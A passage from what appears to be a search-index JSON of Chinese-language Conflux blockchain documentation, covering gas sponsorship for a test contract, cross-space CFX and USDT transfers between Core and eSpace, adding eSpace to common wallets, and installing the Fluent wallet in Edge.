\u540e\u56de\u8f66\uff0c\u53ef\u4ee5\u67e5\u770b\u5f53\u524d\u7684\u4ee3\u4ed8\u60c5\u51b5\uff0c\u82e5\u4e3a0\u6216\u8005\u5f88\u5c0f\u7684\u65f6\u5019\u8bf4\u660e\u9700\u8981\u65b0\u7684\u4ee3\u4ed8\u4e86\uff0c\u5b58\u50a8\u8d39\u4e3astorage\u4ee3\u4ed8\uff0c \u6bcf\u6b21\u4e3a600cfx\uff0c\u71c3\u6c14\u8d39\u4e3agas\u4ee3\u4ed8\uff0c10cfx\uff08gas\u4ee3\u4ed8\u4e00\u822c\u4e00\u6b21\u5c31\u591f\uff0c\u4e3b\u8981\u662fstorage\u7684\u8d39\u7528\u8f83\u9ad8\uff09 \u627e\u4e00\u4e2a\u5df2\u90e8\u7f72\u597d\u7684\u5408\u7ea6\u5730\u5740\uff0c\u5982\uff1acfxtest:acfk3g4v2e3j8tpy5vskznkfu8pnfcp90y8271c9rv \uff08\u6b64\u5408\u7ea6\u6ca1\u6709\u7279\u6b8a\u610f\u4e49\uff0c\u5982\u9700\u4ee3\u4ed8\u6240\u6709\u5730\u5740\uff0c\u9700\u8981\u5728\u4ee3\u7801\u4e2d\u52a0\u4e0aSponsorWhitelistControl \u76f8\u5173\u4ee3\u7801\uff0c\u5408\u7ea6\u7a0b\u5e8f\u5458\u8bf7\u79fb\u6b65 \u4ee3\u4ed8\u5408\u7ea6 \u7684\u7f16\u5199\uff09\u67e5\u8be2\u4e4b\u540e\u53d1\u73b0\uff0c\u5408\u7ea6\u6ca1\u6709\u4efb\u4f55\u4ee3\u4ed8\u989d\u5ea6\uff0c\u8fd9\u4e2a\u65f6\u5019\u70b9\u51fb\u7533\u8bf7 \u8fde\u63a5\u94b1\u5305 \u968f\u4fbf\u9009\u62e9\u4e00\u4e2a\u6709cfx\u7684\u94b1\u5305\uff0c\u56e0\u4e3a\u9700\u8981\u652f\u4ed80.125cfx\u7684\u8d39\u7528\uff08\u4e4b\u540e\u518d\u7528\u5f53\u524d\u5730\u5740\u7533\u8bf7\u4ee3\u4ed8\uff0c\u5c31\u4e0d\u518d\u6d88\u8017cfx\u4e86\uff09 \u5de6\u4e0b\u89d2\u663e\u793a\u5730\u5740\u5373\u53ef\u70b9\u51fb\u7533\u8bf7 \u4e4b\u540e\u70b9\u51fb\u786e\u8ba4\u518d\u7b49\u5f85\u786e\u8ba4\u5373\u53ef \u5173\u95ed\u4ea4\u6613\u54c8\u5e0c\u6846\uff0c\u4e4b\u540e\u81ea\u52a8\u67e5\u8be2\u7ed3\u679c\uff1a Info \u200b \u5f53\u201c\u7533\u8bf7\u201d\u6309\u94ae\u53d8\u6210\u7070\u8272\uff0c\u5b58\u50a8\u8d39600cfx\uff0c\u71c3\u6c14\u8d3910cfx\uff0c\u5219\u8bf4\u660e\u7533\u8bf7\u6210\u529f\uff0c\u63a5\u4e0b\u6765\u4f60\u5c31\u53ef\u4ee5\u65e0\u9700\u652f\u4ed8\u4efb\u4f55gas\u8d39\u7528\u5c31\u80fd\u591f\u4e0e\u60a8\u5f00\u53d1\u7684\u667a\u80fd\u5408\u7ea6\u8fdb\u884c\u4ea4\u4e92\u4e86\uff01","title":"\u8bf4\u660e\u53ca\u64cd\u4f5c\u6b65\u9aa4"},{"location":"development/cross-espace/","text":"cfx\u8de8\u7a7a\u95f4\u64cd\u4f5c\u65b9\u6848 \u00b6 \u4e3a\u4e86\u65b9\u4fbf\u7528\u6237\u5728espace\u4f7f\u7528cfx\uff0c\u4e13\u95e8\u5f00\u53d1\u4e86cfx\u8de8\u7a7a\u95f4\u8c03\u7528\u63a5\u53e3\uff0c\u7528\u6237\u53ef\u4ee5\u65b9\u4fbf\u7684\u4f7f\u7528\u8be5\u65b9\u6848\u5b9e\u73b0\uff1a \u5c06Conflux\u7f51\u7edc\u4e2d\u7684\u539f\u751fcfx\u8de8\u5165espace\uff0c\u5c06cusdt\u8de8\u5165espace\uff0c\u5f62\u6210espace\u4e0b\u7684usdt\u3002 \u5c06espace\u4e2d\u7684ecfx\uff08\u4e3a\u65b9\u4fbf\uff0c\u4e0d\u4e25\u8c28\u7684\u79f0\u5176\u4e3aecfx\uff09\u8f6c\u8d26\u8de8\u56deConflux\u7f51\u7edc\uff0cespace\u4e0b\u7684usdt\u8f6c\u8d26\u8de8\u56deConflux\u7f51\u7edc\u3002 CFX\u8de8\u7a7a\u95f4DAPP \u00b6 Fluent transfer dapp \uff1a\u63d0\u4f9bcfx\uff0ccusdt\uff0cceth\u7b49\u4ee3\u5e01\u8de8\u5165espace\u7a7a\u95f4\uff0c\u6216\u5c06cfx\uff0cusdt\uff0ceth\u4eceespace\u8de8\u5165cspace\u529f\u80fd Conflux hub \uff1a\u63d0\u4f9bcfx\uff0ccusdt\uff0cceth\u7b49\u4ee3\u5e01\u8de8\u5165espace\u7a7a\u95f4\uff0c\u6216\u5c06cfx\uff0cusdt\uff0ceth\u4eceespace\u8de8\u5165cspace\u529f\u80fd\uff0c\u63d0\u4f9bBSC cfx\u4e0eespace cfx\u4e92\u8de8\u529f\u80fd \u8de8\u7a7a\u95f4\u4ea4\u4e92\u63a5\u53e3\u5982\u4e0b\u56fe\u6240\u793a\uff1a \u4eceConflux\u7f51\u7edc\u8de8cfx\u5230espace \u00b6 \u586b\u5199\u9700\u8981\u63a5\u6536ecfx\u7684ETH\u5730\u5740\uff0c\u59820xCCC26c4d84e997904Dc204d83ea912278C8b60a2 \u70b9\u51fbTransfer\u6309\u94ae\uff0cFluent\u7684\u5408\u7ea6\u4ea4\u4e92\u63a5\u53e3\u5c06\u81ea\u52a8\u5f39\u51fa\uff0c\u5982\u4e0b\u56fe\u6240\u793a\uff1a \u70b9\u51fb\u4e0a\u56fe\u4e2d\u5bf9\u5e94\u7684\u786e\u8ba4\u6309\u94ae\uff0c\u8fdb\u884c\u8de8\u7a7a\u95f4\u4ea4\u4e92\uff0c\u5f53\u9875\u9762\u63d0\u793a\u4e0b\u56fe\u4fe1\u606f\u65f6\uff0c\u4ee3\u8868\u8f6c\u79fb\u6210\u529f \u7528\u6237\u53ef\u4ee5\u4f7f\u7528\u4efb\u610f\u652f\u6301Conflux espace\u7684\u94b1\u5305\u67e5\u770b\u8d26\u6237\u4f59\u989d\uff0c\u7528\u6237\u53ef\u53c2\u8003 \u5728\u77e5\u540d\u94b1\u5305\u4e2d\u6dfb\u52a0Conflux espace\u6559\u7a0b \u5728\u77e5\u540d\u94b1\u5305\u4e2d\u6dfb\u52a0Conflux espace\u7684RPC\u7f51\u7edc\u670d\u52a1\u3002 \u4eceespace\u7f51\u7edc\u8de8ecfx\u5230Conflux\u539f\u751f\u7f51\u7edc \u00b6 \u53c2\u8003 \u94fe\u63a5 \u5373\u53ef\uff0c\u65b9\u6cd5\u7c7b\u4f3c\u3002 \u4eceConflux\u7f51\u7edc\u8de8cusdt\u5230espace \u00b6 \u8bbf\u95ee eSpace Bridge\u8de8\u94fe\u5de5\u5177 \uff0c\u70b9\u51fb\u5207\u6362\u6309\u94ae\uff0c\u9009\u62e9 To Conflux eSpace \uff0c\u793a\u610f\u56fe\u5982\u4e0b\u6240\u793a\u3002 \u70b9\u51fb\u5c0f\u72d0\u72f8\u6309\u94ae\uff0c\u83b7\u53d6\u5f53\u524dmetamask\u9009\u62e9\u7684espace\u94b1\u5305\u5730\u5740\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7\u526a\u8d34\u677f\u6307\u5b9a\u4efb\u610f\u8de8\u51fa\u5730\u5740\uff08\u6ce8\u610f\u68c0\u67e5\uff09 \u70b9\u51fbTransfer\u6309\u94ae\uff0c\u5728\u5f39\u51fa\u7684Fluent\u94b1\u5305\u7b7e\u540d\u5904\u786e\u8ba4\u4ea4\u6613\u5373\u53ef\u8de8\u51facusdt\u5230espace\u5f62\u6210usdt \u4eceConflux\u7684espace\u8de8usdt\u5230corespace\u83b7\u5f97cusdt \u00b6 \u8bbf\u95ee eSpace Bridge\u8de8\u94fe\u5de5\u5177 \uff0c\u70b9\u51fb\u5207\u6362\u6309\u94ae\uff0c\u9009\u62e9 To Conflux Core \uff0c\u793a\u610f\u56fe\u5982\u4e0b\u6240\u793a\u3002 \u586b\u5199\u4eceespace\u8de8\u5165corespace\u7684usdt\u6570\u91cf\uff0c\u4ee51usdt\u4e3a\u4f8b\uff0c\u70b9\u51fbTransfer\u6309\u94ae\uff0c\u5728Metamask\u5904\u786e\u8ba4\u4ea4\u6613 \u5f85\u4ea4\u6613\u786e\u8ba4\u540e\uff0c\u5411\u4e0b\u67e5\u770b\u9875\u9762Step2\uff0c\u70b9\u51fbWithdraw\u6309\u94ae\uff0c\u63d0\u53d6cusdt\u5230corespace\u94b1\u5305\u4e2d \u5728fluent\u94b1\u5305\u4e2d\u786e\u8ba4withdraw\u4ea4\u6613\uff0c\u5982\u4e0b\u56fe\u6240\u793a \u6b64\u65f6\u53ef\u4ee5\u5728fluent\u94b1\u5305\u4e2d\u67e5\u770b\u5230cusdt","title":"cfx\u8de8\u7a7a\u95f4\u64cd\u4f5c\u65b9\u6848"},{"location":"development/cross-espace/#cfx","text":"\u4e3a\u4e86\u65b9\u4fbf\u7528\u6237\u5728espace\u4f7f\u7528cfx\uff0c\u4e13\u95e8\u5f00\u53d1\u4e86cfx\u8de8\u7a7a\u95f4\u8c03\u7528\u63a5\u53e3\uff0c\u7528\u6237\u53ef\u4ee5\u65b9\u4fbf\u7684\u4f7f\u7528\u8be5\u65b9\u6848\u5b9e\u73b0\uff1a \u5c06Conflux\u7f51\u7edc\u4e2d\u7684\u539f\u751fcfx\u8de8\u5165espace\uff0c\u5c06cusdt\u8de8\u5165espace\uff0c\u5f62\u6210espace\u4e0b\u7684usdt\u3002 \u5c06espace\u4e2d\u7684ecfx\uff08\u4e3a\u65b9\u4fbf\uff0c\u4e0d\u4e25\u8c28\u7684\u79f0\u5176\u4e3aecfx\uff09\u8f6c\u8d26\u8de8\u56deConflux\u7f51\u7edc\uff0cespace\u4e0b\u7684usdt\u8f6c\u8d26\u8de8\u56deConflux\u7f51\u7edc\u3002","title":"cfx\u8de8\u7a7a\u95f4\u64cd\u4f5c\u65b9\u6848"},{"location":"development/cross-espace/#cfxdapp","text":"Fluent transfer dapp \uff1a\u63d0\u4f9bcfx\uff0ccusdt\uff0cceth\u7b49\u4ee3\u5e01\u8de8\u5165espace\u7a7a\u95f4\uff0c\u6216\u5c06cfx\uff0cusdt\uff0ceth\u4eceespace\u8de8\u5165cspace\u529f\u80fd Conflux hub \uff1a\u63d0\u4f9bcfx\uff0ccusdt\uff0cceth\u7b49\u4ee3\u5e01\u8de8\u5165espace\u7a7a\u95f4\uff0c\u6216\u5c06cfx\uff0cusdt\uff0ceth\u4eceespace\u8de8\u5165cspace\u529f\u80fd\uff0c\u63d0\u4f9bBSC cfx\u4e0eespace cfx\u4e92\u8de8\u529f\u80fd \u8de8\u7a7a\u95f4\u4ea4\u4e92\u63a5\u53e3\u5982\u4e0b\u56fe\u6240\u793a\uff1a","title":"CFX\u8de8\u7a7a\u95f4DAPP"},{"location":"development/cross-espace/#confluxcfxespace","text":"\u586b\u5199\u9700\u8981\u63a5\u6536ecfx\u7684ETH\u5730\u5740\uff0c\u59820xCCC26c4d84e997904Dc204d83ea912278C8b60a2 \u70b9\u51fbTransfer\u6309\u94ae\uff0cFluent\u7684\u5408\u7ea6\u4ea4\u4e92\u63a5\u53e3\u5c06\u81ea\u52a8\u5f39\u51fa\uff0c\u5982\u4e0b\u56fe\u6240\u793a\uff1a \u70b9\u51fb\u4e0a\u56fe\u4e2d\u5bf9\u5e94\u7684\u786e\u8ba4\u6309\u94ae\uff0c\u8fdb\u884c\u8de8\u7a7a\u95f4\u4ea4\u4e92\uff0c\u5f53\u9875\u9762\u63d0\u793a\u4e0b\u56fe\u4fe1\u606f\u65f6\uff0c\u4ee3\u8868\u8f6c\u79fb\u6210\u529f \u7528\u6237\u53ef\u4ee5\u4f7f\u7528\u4efb\u610f\u652f\u6301Conflux espace\u7684\u94b1\u5305\u67e5\u770b\u8d26\u6237\u4f59\u989d\uff0c\u7528\u6237\u53ef\u53c2\u8003 \u5728\u77e5\u540d\u94b1\u5305\u4e2d\u6dfb\u52a0Conflux espace\u6559\u7a0b \u5728\u77e5\u540d\u94b1\u5305\u4e2d\u6dfb\u52a0Conflux espace\u7684RPC\u7f51\u7edc\u670d\u52a1\u3002","title":"\u4eceConflux\u7f51\u7edc\u8de8cfx\u5230espace"},{"location":"development/cross-espace/#espaceecfxconflux","text":"\u53c2\u8003 \u94fe\u63a5 \u5373\u53ef\uff0c\u65b9\u6cd5\u7c7b\u4f3c\u3002","title":"\u4eceespace\u7f51\u7edc\u8de8ecfx\u5230Conflux\u539f\u751f\u7f51\u7edc"},{"location":"development/cross-espace/#confluxcusdtespace","text":"\u8bbf\u95ee eSpace Bridge\u8de8\u94fe\u5de5\u5177 \uff0c\u70b9\u51fb\u5207\u6362\u6309\u94ae\uff0c\u9009\u62e9 To Conflux eSpace \uff0c\u793a\u610f\u56fe\u5982\u4e0b\u6240\u793a\u3002 \u70b9\u51fb\u5c0f\u72d0\u72f8\u6309\u94ae\uff0c\u83b7\u53d6\u5f53\u524dmetamask\u9009\u62e9\u7684espace\u94b1\u5305\u5730\u5740\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7\u526a\u8d34\u677f\u6307\u5b9a\u4efb\u610f\u8de8\u51fa\u5730\u5740\uff08\u6ce8\u610f\u68c0\u67e5\uff09 \u70b9\u51fbTransfer\u6309\u94ae\uff0c\u5728\u5f39\u51fa\u7684Fluent\u94b1\u5305\u7b7e\u540d\u5904\u786e\u8ba4\u4ea4\u6613\u5373\u53ef\u8de8\u51facusdt\u5230espace\u5f62\u6210usdt","title":"\u4eceConflux\u7f51\u7edc\u8de8cusdt\u5230espace"},{"location":"development/cross-espace/#confluxespaceusdtcorespacecusdt","text":"\u8bbf\u95ee eSpace Bridge\u8de8\u94fe\u5de5\u5177 \uff0c\u70b9\u51fb\u5207\u6362\u6309\u94ae\uff0c\u9009\u62e9 To Conflux Core \uff0c\u793a\u610f\u56fe\u5982\u4e0b\u6240\u793a\u3002 \u586b\u5199\u4eceespace\u8de8\u5165corespace\u7684usdt\u6570\u91cf\uff0c\u4ee51usdt\u4e3a\u4f8b\uff0c\u70b9\u51fbTransfer\u6309\u94ae\uff0c\u5728Metamask\u5904\u786e\u8ba4\u4ea4\u6613 \u5f85\u4ea4\u6613\u786e\u8ba4\u540e\uff0c\u5411\u4e0b\u67e5\u770b\u9875\u9762Step2\uff0c\u70b9\u51fbWithdraw\u6309\u94ae\uff0c\u63d0\u53d6cusdt\u5230corespace\u94b1\u5305\u4e2d \u5728fluent\u94b1\u5305\u4e2d\u786e\u8ba4withdraw\u4ea4\u6613\uff0c\u5982\u4e0b\u56fe\u6240\u793a \u6b64\u65f6\u53ef\u4ee5\u5728fluent\u94b1\u5305\u4e2d\u67e5\u770b\u5230cusdt","title":"\u4eceConflux\u7684espace\u8de8usdt\u5230corespace\u83b7\u5f97cusdt"},{"location":"development/espace-wallet/","text":"\u5982\u4f55\u901a\u8fc7\u77e5\u540d\u94b1\u5305\u4f7f\u7528Conflux eSpace \u00b6 \u901a\u8fc7\u6dfb\u52a0\u5b8c\u5168\u517c\u5bb9EVM\u7684Conflux eSpace RPC\uff0c\u80fd\u591f\u5e2e\u52a9\u7528\u6237\u5728\u5927\u591a\u6570\u77e5\u540d\u94b1\u5305\u4e2d\u4f7f\u7528\u5e76\u4eab\u53d7Conflux\u7f51\u7edc\u5e26\u6765\u7684\u4fbf\u6377\u3002\u672c\u6848\u4f8b\u5c06\u7ed9\u51fa\u5c06RPC\u6dfb\u52a0\u5230TokenPocket\uff0cImtoken\u6216Metamask\u7684\u65b9\u6cd5\u3002 \u5982\u4f55\u901a\u8fc7 Metamask \u4f7f\u7528 Conflux eSpace \u00b6 \u8bbf\u95ee Chainlist\u4e3b\u9875 \uff0c\u4f7f\u7528Metamask\u8fde\u63a5\u94b1\u5305\uff0c\u5e76\u5728\u9875\u9762\u4e2d\u641c\u7d22Conflux \u9009\u62e9ChainID\u4e3a1030\u7684\u94fe\uff0c\u70b9\u51fb\u201cAdd To MetaMask\u201d\u6309\u94ae\uff0c\u6b64\u65f6\u4f1a\u5f39\u51fa\u4e00\u6761Metamask\u4ea4\u4e92\u8bf7\u6c42\uff0c\u60a8\u9700\u8981\u6279\u51c6\u8fd9\u4e00\u8bf7\u6c42\uff08\u65e0\u5bb3\uff09 \u6b64\u65f6\u9875\u9762\u4f1a\u8bf7\u6c42\u60a8\u5207\u6362\u7f51\u7edc\uff0c\u540c\u610f\u5373\u53ef \u5207\u6362\u6210\u529f \u5982\u4f55\u901a\u8fc7 TokenPocket \u4f7f\u7528 Conflux eSpace \u00b6 \u6dfb\u52a0\u6559\u7a0b\u89c1 \u5982\u4f55\u901a\u8fc7 TokenPocket \u4f7f\u7528 Conflux eSpace \u5982\u4f55\u901a\u8fc7 Imtoken \u4f7f\u7528 Conflux eSpace \u00b6 \u6dfb\u52a0\u6559\u7a0b\u89c1 \u5982\u4f55\u901a\u8fc7 imToken \u4f7f\u7528 Conflux eSpace","title":"\u5982\u4f55\u901a\u8fc7\u77e5\u540d\u94b1\u5305\u4f7f\u7528Conflux eSpace"},{"location":"development/espace-wallet/#conflux-espace","text":"\u901a\u8fc7\u6dfb\u52a0\u5b8c\u5168\u517c\u5bb9EVM\u7684Conflux eSpace RPC\uff0c\u80fd\u591f\u5e2e\u52a9\u7528\u6237\u5728\u5927\u591a\u6570\u77e5\u540d\u94b1\u5305\u4e2d\u4f7f\u7528\u5e76\u4eab\u53d7Conflux\u7f51\u7edc\u5e26\u6765\u7684\u4fbf\u6377\u3002\u672c\u6848\u4f8b\u5c06\u7ed9\u51fa\u5c06RPC\u6dfb\u52a0\u5230TokenPocket\uff0cImtoken\u6216Metamask\u7684\u65b9\u6cd5\u3002","title":"\u5982\u4f55\u901a\u8fc7\u77e5\u540d\u94b1\u5305\u4f7f\u7528Conflux eSpace"},{"location":"development/espace-wallet/#metamask-conflux-espace","text":"\u8bbf\u95ee Chainlist\u4e3b\u9875 \uff0c\u4f7f\u7528Metamask\u8fde\u63a5\u94b1\u5305\uff0c\u5e76\u5728\u9875\u9762\u4e2d\u641c\u7d22Conflux \u9009\u62e9ChainID\u4e3a1030\u7684\u94fe\uff0c\u70b9\u51fb\u201cAdd To MetaMask\u201d\u6309\u94ae\uff0c\u6b64\u65f6\u4f1a\u5f39\u51fa\u4e00\u6761Metamask\u4ea4\u4e92\u8bf7\u6c42\uff0c\u60a8\u9700\u8981\u6279\u51c6\u8fd9\u4e00\u8bf7\u6c42\uff08\u65e0\u5bb3\uff09 \u6b64\u65f6\u9875\u9762\u4f1a\u8bf7\u6c42\u60a8\u5207\u6362\u7f51\u7edc\uff0c\u540c\u610f\u5373\u53ef \u5207\u6362\u6210\u529f","title":"\u5982\u4f55\u901a\u8fc7 Metamask \u4f7f\u7528 Conflux eSpace"},{"location":"development/espace-wallet/#tokenpocket-conflux-espace","text":"\u6dfb\u52a0\u6559\u7a0b\u89c1 \u5982\u4f55\u901a\u8fc7 TokenPocket \u4f7f\u7528 Conflux eSpace","title":"\u5982\u4f55\u901a\u8fc7 TokenPocket \u4f7f\u7528 Conflux eSpace"},{"location":"development/espace-wallet/#imtoken-conflux-espace","text":"\u6dfb\u52a0\u6559\u7a0b\u89c1 \u5982\u4f55\u901a\u8fc7 imToken \u4f7f\u7528 Conflux eSpace","title":"\u5982\u4f55\u901a\u8fc7 Imtoken \u4f7f\u7528 Conflux eSpace"},{"location":"development/espace/","text":"Conflux eSpace\u4ecb\u7ecd \u00b6 Conflux eSpace \u2014\u2014\u5f15\u5165\u4e00\u4e2a\u5b8c\u5168\u4e0e EVM \u517c\u5bb9\u7684\u65b0\u7a7a\u95f4\uff0c\u8fd9\u4e2a\u65b0\u7684\u7a7a\u95f4\u88ab\u79f0\u4e3a Conflux eSpace \uff0c\u800c\u5f53\u524d\u7684\u7a7a\u95f4\u88ab\u79f0\u4e3a Conflux Core\u3002Conflux eSpace \u9075\u5faa\u4e0e EVM \u76f8\u540c\u7684\u89c4\u5219\uff0c\u5e76\u652f\u6301 eth rpc\uff0c\u5982 eth_getBalance\u3002\u56e0\u6b64\u6765\u81ea\u4ee5\u592a\u574a\u751f\u6001\u7684\u5de5\u5177\u53ef\u76f4\u63a5\u7528\u4e8e Conflux\u3002 CIP-90 \u4e00\u4e2a\u5b8c\u5168\u517c\u5bb9 EVM \u7684\u7a7a\u95f4: https://github.com/Conflux-Chain/CIPs/blob/master/CIPs/cip-90.md Conflux eSpace \u5f00\u53d1\u6587\u6863\uff1a https://developer.confluxnetwork.org/conflux-doc/docs/EVM-Space/intro_of_evm_space Conflux eSpace \u6307\u5357\uff1a https://developer.confluxnetwork.org/v2-hardfork/evm_space_guide \u4e24\u4e2a Space \u7684\u8d26\u6237\u5173\u7cfb\uff1a https://github.com/Pana/conflux-doc/blob/master/docs/EVM-Space/account_explain.md CrossSpaceCall \u5185\u7f6e\u5408\u7ea6\uff1a https://github.com/Pana/conflux-doc/blob/master/docs/EVM-Space/zh/cross_space_call_zh.md Conflux EVM Bridge\uff1a https://github.com/Conflux-Chain/conflux-evm-bridge \u4e0e Web3 JSON-RPC \u534f\u8bae\u7684\u517c\u5bb9\u6027\uff1a https://developer.confluxnetwork.org/conflux-doc/docs/EVM-Space/evm_space_rpc_compatibility/ \u4e24\u4e2aSpace\u4e4b\u95f4CFX\u7684\u8de8\u7a7a\u95f4\u64cd\u4f5c\u94fe\u63a5(\u5df2\u5b9e\u73b0Conflux Core\u548cConflux eSpace\u5408\u7ea6\u5c42CFX\u7684\u8de8\u94fe\u64cd\u4f5c\uff0c\u672a\u6765\u4f1a\u63d0\u4f9b\u5de5\u5177\u652f\u6301\u3002\u7528\u6237\u9700\u8981\u4f7f\u7528Fluent\u94b1\u5305\uff0c\u4e14Conflux Core\u4e2d\u6709CFX\u65f6\u624d\u80fd\u8fdb\u884c\u8de8\u94fe\u64cd\u4f5c)\uff1a https://evm.fluentwallet.com/ \u5982\u4f55\u901a\u8fc7 imToken \u4f7f\u7528 Conflux eSpace: https://forum.conflux.fun/t/imtoken-conflux-espace/13808 \u5982\u4f55\u901a\u8fc7 TokenPocket \u4f7f\u7528 Conflux eSpace: https://forum.conflux.fun/t/tokenpocket-conflux-espace/13807","title":"Conflux eSpace\u4ecb\u7ecd"},{"location":"development/espace/#conflux-espace","text":"Conflux eSpace \u2014\u2014\u5f15\u5165\u4e00\u4e2a\u5b8c\u5168\u4e0e EVM \u517c\u5bb9\u7684\u65b0\u7a7a\u95f4\uff0c\u8fd9\u4e2a\u65b0\u7684\u7a7a\u95f4\u88ab\u79f0\u4e3a Conflux eSpace \uff0c\u800c\u5f53\u524d\u7684\u7a7a\u95f4\u88ab\u79f0\u4e3a Conflux Core\u3002Conflux eSpace \u9075\u5faa\u4e0e EVM \u76f8\u540c\u7684\u89c4\u5219\uff0c\u5e76\u652f\u6301 eth rpc\uff0c\u5982 eth_getBalance\u3002\u56e0\u6b64\u6765\u81ea\u4ee5\u592a\u574a\u751f\u6001\u7684\u5de5\u5177\u53ef\u76f4\u63a5\u7528\u4e8e Conflux\u3002 CIP-90 \u4e00\u4e2a\u5b8c\u5168\u517c\u5bb9 EVM \u7684\u7a7a\u95f4: https://github.com/Conflux-Chain/CIPs/blob/master/CIPs/cip-90.md Conflux eSpace \u5f00\u53d1\u6587\u6863\uff1a https://developer.confluxnetwork.org/conflux-doc/docs/EVM-Space/intro_of_evm_space Conflux eSpace \u6307\u5357\uff1a https://developer.confluxnetwork.org/v2-hardfork/evm_space_guide \u4e24\u4e2a Space \u7684\u8d26\u6237\u5173\u7cfb\uff1a https://github.com/Pana/conflux-doc/blob/master/docs/EVM-Space/account_explain.md CrossSpaceCall \u5185\u7f6e\u5408\u7ea6\uff1a https://github.com/Pana/conflux-doc/blob/master/docs/EVM-Space/zh/cross_space_call_zh.md Conflux EVM Bridge\uff1a https://github.com/Conflux-Chain/conflux-evm-bridge \u4e0e Web3 JSON-RPC \u534f\u8bae\u7684\u517c\u5bb9\u6027\uff1a https://developer.confluxnetwork.org/conflux-doc/docs/EVM-Space/evm_space_rpc_compatibility/ \u4e24\u4e2aSpace\u4e4b\u95f4CFX\u7684\u8de8\u7a7a\u95f4\u64cd\u4f5c\u94fe\u63a5(\u5df2\u5b9e\u73b0Conflux Core\u548cConflux eSpace\u5408\u7ea6\u5c42CFX\u7684\u8de8\u94fe\u64cd\u4f5c\uff0c\u672a\u6765\u4f1a\u63d0\u4f9b\u5de5\u5177\u652f\u6301\u3002\u7528\u6237\u9700\u8981\u4f7f\u7528Fluent\u94b1\u5305\uff0c\u4e14Conflux Core\u4e2d\u6709CFX\u65f6\u624d\u80fd\u8fdb\u884c\u8de8\u94fe\u64cd\u4f5c)\uff1a https://evm.fluentwallet.com/ \u5982\u4f55\u901a\u8fc7 imToken \u4f7f\u7528 Conflux eSpace: https://forum.conflux.fun/t/imtoken-conflux-espace/13808 \u5982\u4f55\u901a\u8fc7 TokenPocket \u4f7f\u7528 Conflux eSpace: https://forum.conflux.fun/t/tokenpocket-conflux-espace/13807","title":"Conflux eSpace\u4ecb\u7ecd"},{"location":"development/fluent/","text":"Fluent\u94b1\u5305\u5b89\u88c5\u914d\u7f6e\u6b65\u9aa4 \u00b6 \u8003\u8651\u5230\u90e8\u5206\u540c\u5fd7FQ\u96be\u7684\u95ee\u9898\uff0c\u7279\u4f7f\u7528Edge\u6d4f\u89c8\u5668\u7ed9\u5404\u4f4d\u89c2\u4f17\u8001\u7237\u4eec\u8fdb\u884c\u5c55\u793a \u4f7f\u7528Edge\u5b89\u88c5Fluent\u94b1\u5305 \u00b6 \u4f7f\u7528edge\u8bbf\u95ee \u5fae\u8f6f\u5e94\u7528\u5546\u5e97 \u641c\u7d22\u201cfluent\u201d\u5173\u952e\u5b57 \u70b9\u51fb\u201c\u83b7\u53d6\u6309\u94ae\u201d\u5728\u5f39\u51fa\u7a97\u53e3\u4e2d\u70b9\u51fb\u201c\u6dfb\u52a0\u6269\u5c55\u201d \u901a\u8fc7Edge\u53f3\u4e0a\u89d2\u4fa7\u8fb9\u680f\u5373\u53ef\u8bbf\u95eeFluent\u94b1\u5305 \u70b9\u51fbFluent\u94b1\u5305\u5185\u7684\u201c\u521b\u5efa\u201d\u6309\u94ae\uff0c\u5e76\u8bbe\u7f6e\u89e3\u9501\u5bc6\u7801 \u5f85\u5bc6\u7801\u8bbe\u7f6e\u5b8c\u6bd5\u540e\uff0c\u70b9\u51fb\u201c\u521b\u5efa\u201d\u6309\u94ae Fluent\u76ee\u524d\u652f\u6301\u901a\u8fc7\u4e09\u79cd\u65b9\u5f0f\u83b7\u53d6\u4e00\u4e2aConflux\u7f51\u7edc\u94b1\u5305\u5730\u5740\uff0c\u5206\u522b\u662f\u201c\u4f7f\u7528\u65b0\u52a9\u8bb0\u8bcd\u751f\u6210\u201d\u3001\u201c\u5bfc\u5165\u5df2\u6709\u52a9\u8bb0\u8bcd\u201d\u3001\u201c\u5bfc\u5165\u79c1\u94a5\u201d\u4e09\u79cd \u5982\u4f55\u786e\u5b9a\u6211\u4f7f\u7528\u54ea\u79cd\u65b9\u5f0f\u5bfc\u5165\u94b1\u5305 \u00b6 \u5982\u679c\u60a8\u662fConflux\u7f51\u7edc\u7684\u65b0\u7528\u6237\uff0c \u8bf7\u4f7f\u7528\u201c\u521b\u5efa\u8d26\u6237\u201d\u529f\u80fd\u4e2d\u7684->\u201c\u65b0\u7684\u52a9\u8bb0\u8bcd\u201d\u529f\u80fd \uff0c\u751f\u6210\u4e00\u7ec4\u65b0\u7684\u52a9\u8bb0\u8bcd\u3002\u6ce8\u610f\uff0c\u60a8\u9700\u8981\u5907\u4efd\u60a8\u7684\u52a9\u8bb0\u8bcd\u5230\u4e00\u4e2a\u5b89\u5168\u4e14\u4ed6\u4eba\u4e0d\u53ef\u89c1\u7684\u4f4d\u7f6e\uff0c\u4ee5\u786e\u4fdd\u60a8\u7684\u8d26\u6237\u5b89\u5168\u3002 \u5982\u679c\u60a8\u66fe\u7ecf\u4f7f\u7528Conflux Portal\u521b\u5efa\u8fc7\u94b1\u5305\uff08\u53ef\u53c2\u8003 \u6559\u7a0b \u4e2d\u5907\u4efd\u7684\u52a9\u8bb0\u8bcd\uff09\uff0c \u8bf7\u4f7f\u7528\u201c\u5bfc\u5165\u8d26\u6237\u201d\u529f\u80fd\u4e2d\u7684->\u201c\u5bfc\u5165\u52a9\u8bb0\u8bcd\u201d\u65b9\u6cd5 \u5c06\u5728\u521b\u5efaPortal\u94b1\u5305\u65f6\u5907\u4efd\u7684\u52a9\u8bb0\u8bcd\u5bfc\u5165Fluent\u3002 \u5982\u679c\u60a8\u4ecd\u7136\u6301\u6709keystore\u5f62\u5f0f\u7684\u94b1\u5305\uff0c\u53ef\u4ee5\u901a\u8fc7\u4f7f\u7528Portal\u7684\u79c1\u94a5\u5bfc\u51fa\u529f\u80fd\uff0c\u5907\u4efdkeystore\u5f62\u5f0f\u5730\u5740\u7684\u660e\u6587\u79c1\u94a5\uff0c\u5e76\u4f7f\u7528Fluent\u63d0\u4f9b\u7684\u201c\u5bfc\u5165\u79c1\u94a5\u201d\u529f\u80fd\u6062\u590dkeystore\u94b1\u5305\u6240\u5bf9\u5e94\u7684\u8d26\u6237\u3002 \u4ee5\u521b\u5efa\u8d26\u6237\u4e3a\u4f8b \u00b6 \u70b9\u51fb\u201c\u65b0\u7684\u52a9\u8bb0\u8bcd\u201d\u6309\u94ae 